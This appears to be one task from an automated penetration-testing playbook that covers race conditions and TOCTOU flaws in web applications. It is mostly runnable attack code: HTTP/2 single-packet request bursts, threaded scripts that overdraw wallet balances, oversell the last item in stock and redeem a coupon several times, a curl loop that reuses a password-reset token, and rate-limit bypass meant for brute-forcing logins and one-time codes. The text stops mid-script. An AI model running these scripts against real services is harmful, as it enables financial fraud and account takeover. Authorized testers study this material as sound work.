================================================================================
TASK 78 ¬∑ RACE CONDITION DETECTION & EXPLOITATION
================================================================================
Covers testing_toolkit.txt Phase 10 Step 33
Finding and exploiting race conditions using single-packet attacks.

OBJECTIVE:
- Identify race-prone endpoints (balance, inventory, limits, coupons)
- Exploit TOCTOU (Time-of-Check to Time-of-Use) vulnerabilities
- Use HTTP/2 single-packet attacks for precise timing
- Duplicate transactions, bypass limits, abuse one-time tokens

================================================================================
INPUTS
================================================================================
outputs/url_corpus_all_in_scope.txt        ‚Üê URL corpus
outputs/live_base_urls.txt                 ‚Üê Live hosts
outputs/har/common_data.txt                ‚Üê Endpoints from HAR
outputs/har/accounts/*_auth.json           ‚Üê Auth tokens
outputs/nuclei/tech_stack.json             ‚Üê Tech detection

================================================================================
OUTPUTS
================================================================================
outputs/race/
‚îú‚îÄ‚îÄ race_prone_endpoints.txt        ‚Üê Identified race-prone endpoints
‚îú‚îÄ‚îÄ race_confirmed.txt              ‚Üê Confirmed race conditions
‚îú‚îÄ‚îÄ toctou_results.txt              ‚Üê TOCTOU exploitation results
‚îú‚îÄ‚îÄ limit_bypass_results.txt        ‚Üê Rate/quantity limit bypasses
‚îú‚îÄ‚îÄ duplicate_transactions.txt      ‚Üê Successful duplicate operations
‚îî‚îÄ‚îÄ race_exploitation_log.txt       ‚Üê Full exploitation log

================================================================================
üß† RACE CONDITION FUNDAMENTALS üß†
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
What is a Race Condition?
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Race condition occurs when:
1. Multiple requests access shared resource
2. Order of execution affects outcome
3. No proper locking/synchronization

TOCTOU (Time-of-Check to Time-of-Use):
  Check balance ‚Üí Deduct balance ‚Üí Execute
  ‚Üë Window of vulnerability here ‚Üë

If two requests arrive in this window, both may pass the check
but only one deduction occurs.

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
High-Value Race Targets
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Target Type          ‚îÇ Attack                    ‚îÇ Impact                   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Balance/Wallet       ‚îÇ Multiple withdrawals      ‚îÇ Overdraw funds           ‚îÇ
‚îÇ Inventory/Stock      ‚îÇ Buy same last item twice  ‚îÇ Oversell inventory       ‚îÇ
‚îÇ Coupon/Promo codes   ‚îÇ Redeem same code N times  ‚îÇ Multiple discounts       ‚îÇ
‚îÇ One-time tokens      ‚îÇ Use reset token twice     ‚îÇ Account takeover         ‚îÇ
‚îÇ Rate limits          ‚îÇ Bypass request limits     ‚îÇ Brute force enablement   ‚îÇ
‚îÇ Voting/Likes         ‚îÇ Vote multiple times       ‚îÇ Manipulation             ‚îÇ
‚îÇ File operations      ‚îÇ Symlink race              ‚îÇ Privilege escalation     ‚îÇ
‚îÇ Registration         ‚îÇ Claim same username       ‚îÇ Account issues           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

================================================================================
PHASE 1: IDENTIFY RACE-PRONE ENDPOINTS
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.1 Search for Financial/Critical Endpoints
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
mkdir -p outputs/race temp/agent1/race

# Keywords indicating race-prone operations
RACE_KEYWORDS=(
    "balance"
    "wallet"
    "transfer"
    "withdraw"
    "deposit"
    "payment"
    "checkout"
    "purchase"
    "buy"
    "redeem"
    "coupon"
    "promo"
    "discount"
    "voucher"
    "gift"
    "credit"
    "points"
    "reward"
    "vote"
    "like"
    "follow"
    "claim"
    "apply"
    "submit"
    "confirm"
    "verify"
    "activate"
    "register"
    "invite"
    "referral"
)

# Search URL corpus
for keyword in "${RACE_KEYWORDS[@]}"; do
    grep -i "$keyword" outputs/url_corpus_all_in_scope.txt
done | sort -u > temp/agent1/race/potential_race_endpoints.txt

# Search HAR data
for keyword in "${RACE_KEYWORDS[@]}"; do
    grep -i "$keyword" outputs/har/common_data.txt 2>/dev/null
done | sort -u >> temp/agent1/race/potential_race_endpoints.txt

sort -u temp/agent1/race/potential_race_endpoints.txt > outputs/race/race_prone_endpoints.txt

echo "[*] Found $(wc -l < outputs/race/race_prone_endpoints.txt) potential race-prone endpoints"

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.2 Identify State-Changing POST Endpoints
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# find_state_changing.sh

echo "[*] Finding state-changing endpoints..."

# Extract POST endpoints from HAR analysis
grep -iE "POST|PUT|PATCH|DELETE" outputs/har/common_data.txt 2>/dev/null | \
    sort -u > temp/agent1/race/state_changing_methods.txt

# Combine with race-prone endpoints
cat temp/agent1/race/state_changing_methods.txt >> outputs/race/race_prone_endpoints.txt
sort -u -o outputs/race/race_prone_endpoints.txt outputs/race/race_prone_endpoints.txt

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.3 Prioritize by Impact
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# prioritize_race_targets.py

import re

HIGH_PRIORITY = [
    r'balance|wallet|fund|money|credit|payment|checkout|purchase|buy|withdraw|transfer',
    r'coupon|promo|discount|voucher|gift|redeem',
    r'vote|like|rating|review',
    r'token|verify|confirm|activate|reset',
]

MEDIUM_PRIORITY = [
    r'follow|subscribe|invite|referral',
    r'claim|apply|submit|register',
    r'stock|inventory|quantity|limit',
]

def score_endpoint(url):
    score = 0
    url_lower = url.lower()
    
    for pattern in HIGH_PRIORITY:
        if re.search(pattern, url_lower):
            score += 10
    
    for pattern in MEDIUM_PRIORITY:
        if re.search(pattern, url_lower):
            score += 5
    
    # POST/PUT/PATCH get bonus
    if any(m in url_lower for m in ['post', 'create', 'update', 'delete']):
        score += 3
    
    return score

# Read and score endpoints
scored = []
with open('outputs/race/race_prone_endpoints.txt') as f:
    for line in f:
        url = line.strip()
        if url:
            score = score_endpoint(url)
            scored.append((score, url))

# Sort by score descending
scored.sort(reverse=True)

# Write prioritized list
with open('outputs/race/race_prone_endpoints.txt', 'w') as f:
    for score, url in scored:
        if score > 0:
            f.write(f"{url}|priority:{score}\n")

print(f"[*] Prioritized {len(scored)} endpoints")

================================================================================
PHASE 2: TURBO INTRUDER / SINGLE-PACKET ATTACK
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.1 Understanding Single-Packet Attack
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Traditional race: Send requests in parallel
#   - Network latency causes timing variance
#   - Requests arrive at different times

# Single-packet attack (HTTP/2):
#   - Send multiple requests in ONE TCP packet
#   - All requests arrive at EXACT same time
#   - Eliminates network jitter

# This is the most reliable race condition technique

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.2 Install Race Condition Tools
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Requests-Racer (Python)
pip install requests-racer

# H2SpaceX (HTTP/2 single-packet)
git clone https://github.com/nxenon/h2spacex.git
cd h2spacex
pip install -r requirements.txt

# race-the-web (Go)
go install github.com/insp3ctre/race-the-web@latest

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.3 H2SpaceX Single-Packet Attack
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# h2spacex_race.py

"""
HTTP/2 Single-Packet Attack using h2spacex
All requests arrive at exactly the same time
"""

import sys
sys.path.insert(0, 'temp/agent1/h2spacex')

from h2spacex import H2OnTlsConnection

def single_packet_race(host, port, requests, ssl=True):
    """
    Send multiple requests in a single TCP packet
    
    Args:
        host: Target hostname
        port: Target port
        requests: List of (method, path, headers, body) tuples
        ssl: Use TLS
    """
    
    conn = H2OnTlsConnection(
        hostname=host,
        port_number=port
    )
    
    conn.setup_connection()
    
    # Prepare all requests but don't send yet
    stream_ids = []
    for method, path, headers, body in requests:
        sid = conn.send_request(
            method=method,
            path=path,
            headers=headers,
            body=body,
            end_stream=(body is None)
        )
        stream_ids.append(sid)
    
    # Send all at once (single packet)
    conn.send_all_pending()
    
    # Collect responses
    responses = []
    for sid in stream_ids:
        resp = conn.get_response(sid)
        responses.append(resp)
    
    conn.close_connection()
    
    return responses

# Example: Race on coupon redemption
def race_coupon_redeem(target_url, coupon_code, auth_cookie, num_requests=10):
    """Race condition on coupon redemption"""
    
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    host = parsed.netloc.split(':')[0]
    port = int(parsed.port) if parsed.port else (443 if parsed.scheme == 'https' else 80)
    path = parsed.path
    
    # Prepare N identical requests
    requests = []
    for _ in range(num_requests):
        headers = [
            (':method', 'POST'),
            (':path', path),
            (':scheme', parsed.scheme),
            (':authority', host),
            ('content-type', 'application/x-www-form-urlencoded'),
            ('cookie', auth_cookie),
        ]
        body = f'coupon={coupon_code}'
        requests.append(('POST', path, headers, body))
    
    responses = single_packet_race(host, port, requests)
    
    # Count successes
    successes = sum(1 for r in responses if r.status_code == 200)
    print(f"[*] Sent {num_requests} requests, {successes} succeeded")
    
    return responses

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.4 Requests-Racer for HTTP/1.1
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# requests_racer_attack.py

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time

class RaceConditionTester:
    def __init__(self, url, method='POST', headers=None, data=None, cookies=None):
        self.url = url
        self.method = method
        self.headers = headers or {}
        self.data = data
        self.cookies = cookies
        self.results = []
        self.barrier = None
    
    def make_request(self, request_id):
        """Single request that waits at barrier for synchronization"""
        session = requests.Session()
        session.verify = False
        
        # Wait at barrier until all threads are ready
        self.barrier.wait()
        
        start = time.time()
        try:
            if self.method == 'POST':
                resp = session.post(
                    self.url,
                    headers=self.headers,
                    data=self.data,
                    cookies=self.cookies,
                    timeout=30
                )
            else:
                resp = session.get(
                    self.url,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=30
                )
            
            elapsed = time.time() - start
            return {
                'id': request_id,
                'status': resp.status_code,
                'length': len(resp.text),
                'time': elapsed,
                'body': resp.text[:500]
            }
        except Exception as e:
            return {
                'id': request_id,
                'error': str(e)
            }
    
    def race(self, num_requests=10):
        """Execute race condition attack"""
        
        # Barrier ensures all threads start at the same time
        self.barrier = threading.Barrier(num_requests)
        
        with ThreadPoolExecutor(max_workers=num_requests) as executor:
            futures = [
                executor.submit(self.make_request, i) 
                for i in range(num_requests)
            ]
            
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)
        
        return self.results
    
    def analyze_results(self):
        """Analyze race results for anomalies"""
        success_count = sum(1 for r in self.results if r.get('status') == 200)
        unique_responses = len(set(r.get('body', '')[:100] for r in self.results))
        
        print(f"\n=== Race Condition Analysis ===")
        print(f"Total requests: {len(self.results)}")
        print(f"Successful (200): {success_count}")
        print(f"Unique responses: {unique_responses}")
        
        if success_count > 1:
            print(f"\n[!] POTENTIAL RACE CONDITION: {success_count} successes!")
        
        return success_count > 1

# Example usage
if __name__ == "__main__":
    # Test coupon redemption race
    tester = RaceConditionTester(
        url="https://target.com/api/redeem",
        method='POST',
        data={'coupon': 'DISCOUNT50'},
        cookies={'session': 'YOUR_SESSION_COOKIE'}
    )
    
    results = tester.race(num_requests=20)
    tester.analyze_results()

================================================================================
PHASE 3: TOCTOU EXPLOITATION
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.1 Balance/Wallet TOCTOU
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# toctou_balance.py

"""
TOCTOU attack on balance-based operations

Target flow:
1. Check balance >= amount
2. Process transaction
3. Deduct balance

Attack: Send multiple withdrawals simultaneously
        All pass step 1, only one deduction in step 3
"""

import requests
import threading
from concurrent.futures import ThreadPoolExecutor

def withdraw_money(session, url, amount, results, barrier):
    """Single withdrawal request"""
    barrier.wait()  # Synchronize start
    
    try:
        resp = session.post(url, json={'amount': amount}, timeout=30)
        results.append({
            'status': resp.status_code,
            'body': resp.json() if resp.headers.get('content-type', '').startswith('application/json') else resp.text
        })
    except Exception as e:
        results.append({'error': str(e)})

def toctou_balance_attack(target_url, withdraw_amount, auth_headers, num_requests=10):
    """
    Attack: Withdraw more than balance allows
    
    Example: Balance = $100, Withdraw $100 x 10 times
             Expected: 1 success, 9 failures
             Vulnerable: Multiple successes (overdraw)
    """
    
    results = []
    barrier = threading.Barrier(num_requests)
    
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        sessions = [requests.Session() for _ in range(num_requests)]
        for s in sessions:
            s.headers.update(auth_headers)
            s.verify = False
        
        futures = [
            executor.submit(withdraw_money, sessions[i], target_url, withdraw_amount, results, barrier)
            for i in range(num_requests)
        ]
        
        for f in futures:
            f.result()
    
    # Analyze
    successes = [r for r in results if r.get('status') == 200]
    print(f"[*] Withdrawals attempted: {num_requests}")
    print(f"[*] Successful withdrawals: {len(successes)}")
    
    if len(successes) > 1:
        print(f"[!] TOCTOU VULNERABILITY CONFIRMED!")
        print(f"[!] Overdraw possible: {len(successes)} x ${withdraw_amount}")
        return True
    
    return False

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.2 Inventory TOCTOU (Last Item Attack)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# toctou_inventory.py

"""
Attack: Buy the last item in stock multiple times

Flow:
1. Check inventory > 0
2. Process purchase
3. Decrement inventory

If inventory = 1, race can sell same item to multiple buyers
"""

def race_last_item(purchase_url, product_id, auth_headers, num_buyers=5):
    """Race to buy last item in stock"""
    
    results = []
    barrier = threading.Barrier(num_buyers)
    
    def buy_item(session, results, barrier):
        barrier.wait()
        try:
            resp = session.post(
                purchase_url,
                json={'product_id': product_id, 'quantity': 1},
                timeout=30
            )
            results.append({
                'status': resp.status_code,
                'response': resp.text[:500]
            })
        except Exception as e:
            results.append({'error': str(e)})
    
    with ThreadPoolExecutor(max_workers=num_buyers) as executor:
        sessions = [requests.Session() for _ in range(num_buyers)]
        for s in sessions:
            s.headers.update(auth_headers)
            s.verify = False
        
        futures = [
            executor.submit(buy_item, sessions[i], results, barrier)
            for i in range(num_buyers)
        ]
        
        for f in futures:
            f.result()
    
    successes = [r for r in results if r.get('status') == 200 and 'success' in r.get('response', '').lower()]
    
    if len(successes) > 1:
        print(f"[!] INVENTORY RACE: Sold last item to {len(successes)} buyers!")
        return True
    
    return False

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.3 One-Time Token TOCTOU
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# race_token.sh

# Attack: Use one-time token multiple times
# Example: Password reset token, verification code, invite link

TOKEN="$1"
RESET_URL="https://target.com/api/reset-password"
NEW_PASSWORD="Pwned123!"

# Send 10 simultaneous requests with same token
for i in $(seq 1 10); do
    curl -sk "$RESET_URL" \
        -d "token=$TOKEN&password=$NEW_PASSWORD" &
done

wait

echo "[*] Sent 10 race requests with token: $TOKEN"
echo "[*] Check if password was set multiple times"

================================================================================
PHASE 4: LIMIT BYPASS VIA RACE
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.1 Rate Limit Bypass
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# race_rate_limit.py

"""
Bypass rate limits using race conditions

If rate limit is checked after request processing starts,
simultaneous requests may all pass the check
"""

import requests
import threading
from concurrent.futures import ThreadPoolExecutor

def race_rate_limit(target_url, payload, auth_headers, num_requests=100):
    """
    Send burst of requests to bypass rate limiting
    
    Useful for:
    - Brute force login
    - OTP verification
    - API abuse
    """
    
    results = []
    barrier = threading.Barrier(num_requests)
    
    def make_request(session, results, barrier):
        barrier.wait()
        try:
            resp = session.post(target_url, data=payload, timeout=30)
            results.append({
                'status': resp.status_code,
                'rate_limited': resp.status_code == 429
            })
        except:
            pass
    
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        sessions = [requests.Session() for _ in range(num_requests)]
        for s in sessions:
            s.headers.update(auth_headers)
            s.verify = False
        
        futures = [
            executor.submit(make_request, sessions[i], results, barrier)
            for i in range(num_requests)
        ]
        
        for f in futures:
            f.result()
    
    # Analyze
    passed = sum(1 for r in results if not r.get('rate_limited', True))
    blocked = sum(1 for r in results if r.get('rate_limited', False))
    
    print(f"[*] Requests sent: {num_requests}")
    print(f"[*] Passed rate limit: {passed}")
    print(f"[*] Blocked (429): {blocked}")
    
    if passed > 10:  # Should be much lower with proper rate limiting
